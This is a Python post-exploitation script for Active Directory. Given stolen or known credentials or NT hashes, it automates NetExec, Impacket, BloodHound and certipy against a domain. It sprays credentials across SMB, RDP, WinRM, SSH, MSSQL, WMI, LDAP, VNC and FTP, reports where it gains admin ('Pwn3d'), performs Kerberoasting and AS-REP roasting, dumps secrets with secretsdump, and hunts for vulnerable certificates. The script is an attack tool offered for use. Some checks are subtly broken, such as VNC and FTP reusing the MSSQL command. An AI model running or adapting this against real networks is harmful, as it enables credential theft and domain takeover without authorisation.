#!/usr/bin/env python3 

#Script used to run crackmapexec and impacket when you already have a username and password to attack a domain, will not autoexploit anything
#Impacket will only be ran if RHOST is used
#User either RHOST or Network or File, do not try to run with more than one at a time
#if domain name is unknown run script and it will show you the domain name

import os, sys, time, subprocess
try:
    import argparse
except ImportError:
    os.system("python3 -m pip install argparse")
    os.system("python -m pip install argparse")

from subprocess import Popen
try:
    from colorama import Fore
except ImportError:
    os.system("python3 -m pip install colorama")
    os.system("python -m pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Crackmapexec", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST, -r 10.10.10.1 ; ex: 10.10.10.0/24")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
parser.add_argument("-J", "--JustTest", action="store_true", help="Test network to see if you have Pwn3d on the different services")
parser.add_argument("-H", "--HASH", action="store", help="NT hashes")
parser.add_argument("-F", "--FILE", action="store", help="IP address file ex: internal.txt (Do not use with rhost)")
parser.add_argument("-B", "--BLOOD", action="store_true", help="Run Bloodhound")
parser.add_argument("-I", "--IMPACKET", action="store_true", help="Run Impacket against target, works best if you know you are an administrator")
parser.add_argument("-C", "--CERTIFICATES", action="store_true", help="See if there are any vulnerable certificates")
parser.add_argument("-Z", "--PWN3D", action="store", help="Use if you have changed your cme.conf file to show something different than Pwn3d!, ex: -Z Shell! or -Z Admin!")
parser.add_argument("-L", "--LDAPT", action="store_true", help="Also test for LDAP, can take a long time")
args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
DOMAIN = args.DOMAIN
USERNAME = args.USERNAME
PASSWORD = args.PASSWORD
HASH = args.HASH
FILE = args.FILE
IMP = args.IMPACKET
Z = args.PWN3D
TEST = args.JustTest 
L = args.LDAPT
BLOOD = args.BLOOD

c = "nxc"
cs = f"{c} smb"
cw = f"{c} winrm"
ch = f"{c} ssh"
cl = f"{c} ldap"
cm = f"{c} mssql"
cr = f"{c} rdp"
cwm = f"{c} wmi"
cv = f"{c} vnc"
cf = f"{c} ftp"
crup = f"{RHOST or FILE} -u {USERNAME} -p {PASSWORD}"
cruh = f"{RHOST or FILE} -u {USERNAME} -H {HASH}"
smbarg = "--shares --groups --users --sessions --computers --pass-pol"
i = f"{DOMAIN}/{USERNAME}:{PASSWORD}@{RHOST}"
ih = f"{DOMAIN}/{USERNAME}@{RHOST} -hashes :{HASH}"
iwd = f"/{USERNAME}:{PASSWORD}@{RHOST}"
iwdh = f"/{USERNAME}@{RHOST} -hashes :{HASH}"
inp = f"GetNPUsers.py {i}"
inph = f"GetNPUsers.py {ih}"
ispn = f"GetUserSPNs.py {i}"
ispnh = f"GetUserSPNs.py {ih}"
isid = f"lookupsid.py {i}"
isidh = f"lookupsid.py {ih}"
isec = f"secretsdump.py {i}"
isech = f"secretsdump.py {ih}"
linp = f"GetNPUsers.py {iwd}"
linph = f"GetNPUsers.py {iwdh}"
lispn = f"GetUserSPNs.py {iwd}"
lispnh = f"GetUserSPNs.py {iwdh}"
lisid = f"lookupsid.py {iwd}"
lisidh = f"lookupsid.py {iwdh}"
lisec = f"secretsdump.py {iwd}"
lisech = f"secretsdump.py {iwdh}"

def NMAPR():
    print(f"{YELLOW}Running NMAP against target to not waste your time{RESET}\n")
    subprocess.call([f"nmap -p 445,22,21,3389,5985,636,1433,5600,135 -open -Pn {RHOST} > ports.txt"], shell=True)
    with open ("ports.txt", "r") as f:
        content = f.read()
        print(content)
def NMAPF():
    print(f"{YELLOW}Running NMAP against target to not waste your time{RESET}\n")
    subprocess.call([f"nmap -p 445,22,21,3389,5985,636,1433,5600,135 -open -Pn -iL {FILE} > ports.txt"], shell=True)
    with open ("ports.txt", "r") as f:
        content = f.read()
        print(content)

def TESTME():
    print(f"{YELLOW}Running tests to see if we have {Z}{RESET}")
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            s = Popen([f"{cs} {crup} >> {t}"], shell=True)
            s.wait()
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {crup} >> {t}"], shell=True)
            s.wait()
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {crup} >> {t}"], shell=True)
            s.wait()
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {crup} >> {t}"], shell=True)
            s.wait()
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
    print(f"{MAGENTA}\nReminder you have {RED}{Z}{RESET}{MAGENTA} on the following (if any){RED}\n")
    s = Popen([f"cat *.txt | grep {Z}"], shell=True)
    s.wait()
    print(f"{RESET}")
def LDAPTEST():
    t = "LDAP.txt"
    with open ("ports.txt", "r") as f:
        word = "636/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against LDAP and saving to {t}{RESET}")
            s = Popen([f"{cl} {crup} >> {t}"], shell=True)
            s.wait()

def TESTMEH():
    print(f"{YELLOW}Running tests to see if we have {Z}{RESET}")
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            s = Popen([f"{cs} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
    print(f"{MAGENTA}\nReminder you have {RED}{Z}{RESET}{MAGENTA} on the following (if any){RED}\n")
    s = Popen([f"cat *.txt | grep {Z}"], shell=True)
    s.wait()
    print(f"{RESET}")

def SMBUP():
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            print(f"{GREEN}\n Finding the following for domain user --shares --groups --users --sessions --computers --pass-pol{RESET}")
            s = Popen([f"{cs} {crup} {smbarg} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\n Finding the following for local authentication --shares --groups --users --sessions --computers --pass-pol {RESET}")
            s = Popen([f"{cs} {crup} {smbarg} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"{RED}{Z} on SMB{RESET}")
def RDPUP():
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on RDP{RESET}")
def WINRMUP():
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WINRM with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cw} {crup} >> {t}"], shell=True)
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WINRM{RESET}")
def SSHUP():
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on SSH{RESET}")
def LDAPUP():
    t = "LDAP.txt"
    with open ("ports.txt", "r") as f:
        word = "636/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against LDAP and checking delegation, password not required and more, saving to {t}{RESET}")
            s = Popen([f"{cl} {crup} --trusted-for-delegation --password-not-required  >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against LDAP and checking delegation, password not required and more, with local authentication saving to {t}{RESET}")
            s = Popen([f"{cl} {crup} --trusted-for-delegation --password-not-required --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on LDAP{RESET}")
def MSSQLUP():
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against MSSQL with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on MSSQL{RESET}")
def WMIUP():
    t = "WMI.txt"
    with open ("ports.txt", "r") as f:
        word = "135/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WMI, saving to {t}{RESET}")
            s = Popen([f"{cwm} {crup} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WMI with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cwm} {crup} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WMI{RESET}")
def VNCUP():
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on VNC{RESET}")
def FTPUP():
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {crup} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on FTP{RESET}")
################################################################HASH############################################################################################################

def SMBH():
    t = "SMB.txt"
    with open ("ports.txt", "r") as f:
        word = "445/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SMB, saving to {t}{RESET}")
            print(f"{GREEN}\n Finding the following for domain user --shares --groups --users --sessions --computers --pass-pol{RESET}")
            s = Popen([f"{cs} {cruh} {smbarg} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\n Finding the following for local authentication --shares --groups --users --sessions --computers --pass-pol {RESET}")
            s = Popen([f"{cs} {cruh} {smbarg} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"{RED}{Z} on SMB{RESET}")
def RDPH():
    t = "RDP.txt"
    with open ("ports.txt", "r") as f:
        word = "3389/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against RDP, saving to {t}{RESET}")
            s = Popen([f"{cr} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on RDP{RESET}")
def WINRMH():
    t = "WINRM.txt"
    with open ("ports.txt", "r") as f:
        word = "5985/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WINRM, saving to {t}{RESET}")
            s = Popen([f"{cw} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against WINRM with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cw} {cruh} >> {t}"], shell=True)
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WINRM{RESET}")
def SSHH():
    t = "SSH.txt"
    with open ("ports.txt", "r") as f:
        word = "22/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against SSH, saving to {t}{RESET}")
            s = Popen([f"{ch} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on SSH{RESET}")
def LDAPH():
    t = "LDAP.txt"
    with open ("ports.txt", "r") as f:
        word = "636/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against LDAP and checking delegation, password not required and more, saving to {t}{RESET}")
            s = Popen([f"{cl} {cruh} --trusted-for-delegation --password-not-required  >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against LDAP and checking delegation, password not required and more, with local authentication saving to {t}{RESET}")
            s = Popen([f"{cl} {cruh} --trusted-for-delegation --password-not-required --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on LDAP{RESET}")
def MSSQLH():
    t = "MSSQL.txt"
    with open ("ports.txt", "r") as f:
        word = "1433/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against MSSQL, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{GREEN}\nRunning against MSSQL with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on MSSQL{RESET}")
def WMIH():
    t = "WMI.txt"
    with open ("ports.txt", "r") as f:
        word = "135/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against WMI, saving to {t}{RESET}")
            s = Popen([f"{cwm} {cruh} >> {t}"], shell=True)
            s.wait()
            print(f"{YELLOW}\nRunning against WMI with local authentication, saving to {t}{RESET}")
            s = Popen([f"{cwm} {cruh} --local-auth >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = f"{Z}"
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on WMI{RESET}")
def VNCH():
    t = "VNC.txt"
    with open ("ports.txt", "r") as f:
        word = "5600/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against VNC, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on VNC{RESET}")
def FTPH():
    t = "FTP.txt"
    with open ("ports.txt", "r") as f:
        word = "21/tcp"
        content = f.read()
        if word in content:
            print(f"{YELLOW}\nRunning against FTP, saving to {t}{RESET}")
            s = Popen([f"{cm} {cruh} >> {t}"], shell=True)
            s.wait()
            with open (f"{t}", "r") as f:
                content = f.read()
                print(content)
            with open (f"{t}", "r") as f:
                word = Z
                content = f.read()
                if word in content:
                    print(f"\n{RED}{Z} on FTP{RESET}")

#################################################################IMPACKET#####################################################################

def IMPACKETADUP():
    t = "Impacket.txt"
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{inp} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{ispn} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{isid} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{isec} >> secrets.txt"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{inp} >> {t}"], shell=True)
    s.wait()
    print(f"\n{MAGENTA}Trying with local authentication{RESET}")
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{linp} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{lispn} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{lisid} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{lisec} >> secrets.txt"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{linp} >> {t}"], shell=True)
    s.wait()
    with open ("Impacket.txt", "r") as f:
        content = f.read()
        print(content)
    if os.stat("secrets.txt") != 0:
        with open ("secrets.txt", "r") as f:
            content = f.read()
            print(content)
def IMPACKETADH():
    t = "Impacket.txt"
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{inph} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{ispnh} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{isidh} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{isech} >> {t}"], shell=True)
    s.wait()
    print(f"\n{MAGENTA}Trying with local authentication{RESET}")
    print(f"\n{YELLOW}Running Impacket GetNPUsers on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{linph} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket GetUserSPNs on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{lispnh} -request >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket SID on target, saving to Impacket.txt{RESET}")
    s = Popen([f"{lisidh} >> {t}"], shell=True)
    s.wait()
    print(f"\n{YELLOW}Running Impacket Secretsdump on target, saving to secrets.txt{RESET}")
    s = Popen([f"{lisech} >> {t}"], shell=True)
    s.wait()
    with open ("Impacket.txt", "r") as f:
        content = f.read()
        print(content)
    with open ("secrets.txt", "r") as f:
        content = f.read()
        print(content)
def SMBSTAT():
    with open ("SMB.txt", "r") as f:
        word = "STATUS_PASSWORD_MUST_CHANGE"
        content = f.read()
        if word in content:
            print(f"{RED}\nUser has STATUS_PASSWORD_MUST_CHANGE{RESET}")
            s = Popen([f"cat SMB.txt | grep STATUS_PASSWORD_MUST_CHANGE"], shell=True)
            s.wait()

def D():
    print(f"{YELLOW}Getting Domain Name and saving to domain_name.txt{RESET}")
    s = Popen([f"nxc smb {RHOST} > a.txt"], shell=True)
    s.wait()
    s = Popen([f"cut -d ':' -f 3 a.txt > b.txt"], shell=True)
    s.wait()
    s = Popen([f"cut -d ')' -f 1 b.txt > domain.txt"], shell=True)
    s.wait()
    s = Popen([f"cat domain.txt | sed 's/ //g' > domain1.txt"], shell=True)
    s.wait()
    s = Popen([f"cat domain1.txt | sed 's/ //g' > domain.txt"], shell=True)
    s.wait()
    s = Popen([f"tr -d '\n' < domain.txt > domain_name.txt"], shell=True)
    s.wait()
    with open ("domain_name.txt", "r") as f:
        content = f.read()
        print(f"{YELLOW}Domain name is {MAGENTA}{content}{RESET}")
    os.remove("a.txt")
    os.remove("b.txt")
    os.remove("domain1.txt")
    os.remove("domain.txt")

def BLOODUP():
    path = 'Blood'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    with open("../domain_name.txt", "r") as f:
        content = f.read()
    s = Popen([f"bloodhound-python -d {content} -u {USERNAME} -p {PASSWORD} -c all -ns {RHOST}"], shell=True)
    s.wait()

def BLOODH():
    path = 'Blood'
    check_path = os.path.isdir(path)
    if check_path == True:
        os.chdir(path)
    else:
        os.mkdir(path)
        os.chdir(path)
    with open("../domain_name.txt", "r") as f:
        content = f.read()
    s = Popen([f"bloodhound-python -d {content} -u {USERNAME} --hashes 00000000000000000000000000000000:{HASH} -c all -ns {RHOST}"], shell=True)
    s.wait()

def HOSTS():
    with open ("domain_name.txt", "r") as f:
        content = f.read()
        print (f"{YELLOW}IP address is {MAGENTA}{RHOST}{RESET}")
    with open ("/etc/hosts", "r") as f:
        content = f.read()
        print(content)

def CERT():
    print(f"{MAGENTA}\nLooking for vulnerable certificates{RESET}\n")
    s = Popen([f"certipy-ad find -u {USERNAME} -p {PASSWORD} -dc-ip {RHOST} -stdout -vulnerable"], shell=True)
    s.wait()

def REMINDER():
    print(f"{MAGENTA}\nReminder you have {RED}{Z}{RESET}{MAGENTA} on the following (if any){RED}\n")
    s = Popen([f"cat *.txt | grep {Z}"], shell=True)
    s.wait()
    print(f"{RESET}")
def LANEBOY():
    print(f"\n{YELLOW}I know a thing or two about pain and darkness...{RESET}")
def VIOLENCE():
    print(f"\n{RED}Sometimes quiet is violence...{RESET}")
def EYELIDS():
    print(f"\n{RED}Behind my eyelids are mountains of violence...{RESET}")
def FEAR():
    print(f"\n{YELLOW}I will fear the night again...{RESET}")

#####################################################################################################################

def main():
    if CERT is not False and USERNAME != None and PASSWORD != None:
        CERT();quit()
    else:
        print(f"{RED}Need username and password for certipy-ad{RESET}")

    if BLOOD is not False and PASSWORD != None:
        D();BLOODUP();quit()
    
    if BLOOD is not False and HASH != None:
        D();BLOODH();quit()

    if FILE != None:
        NMAPF()

    if RHOST != None:
        NMAPR()
    
    if TEST is not False and PASSWORD != None:
        if L is not False:
            TESTME();SMBSTAT();LDAPTEST();LANEBOY()
    
        else:
            TESTME();SMBSTAT();LANEBOY()
    
    if TEST is not False and HASH != None:
        if L is not False:
            TESTMEH();LDAPTEST();SMBSTAT();LANEBOY()
    
        else:
            TESTMEH();SMBSTAT();LANEBOY()
    if PASSWORD != None and TEST is not True:
    
        if L is not False:
            SMBUP();RDPUP();WINRMUP();SSHUP()
            LDAPUP();MSSQLUP();WMIUP();VNCUP()
            SMBSTAT();REMINDER();EYELIDS()
    
        else:
            SMBUP();RDPUP();WINRMUP();SSHUP()
            MSSQLUP();WMIUP();VNCUP();SMBSTAT()
            REMINDER();EYELIDS()
    
    if HASH != None and TEST is not True:
        print(f"Trying with hash {HASH}")
        if L is not False:
            SMBH();RDPH();WINRMH();SSHH();LDAPH();
            MSSQLH();WMIH();VNCH();SMBSTAT();REMINDER();
            VIOLENCE()
        else:
            SMBH();RDPH();WINRMH();SSHH();
            MSSQLH();WMIH();VNCH();SMBSTAT();
            REMINDER();VIOLENCE()

    if IMP is not False and DOMAIN == None:
        D()
        print(f"{RED}Need -d argument for domain name shown above{RESET}")
        quit()
    if IMP is not False and DOMAIN != None:
        D()
        HOSTS()
        input(f"{RED}Put domain name in /etc/hosts, press enter to continue{RESET}")
        if PASSWORD != None:
            IMPACKETADUP()
        if HASH != None:
            IMPACKETADH()
        FEAR()

if __name__ == '__main__':
    main()
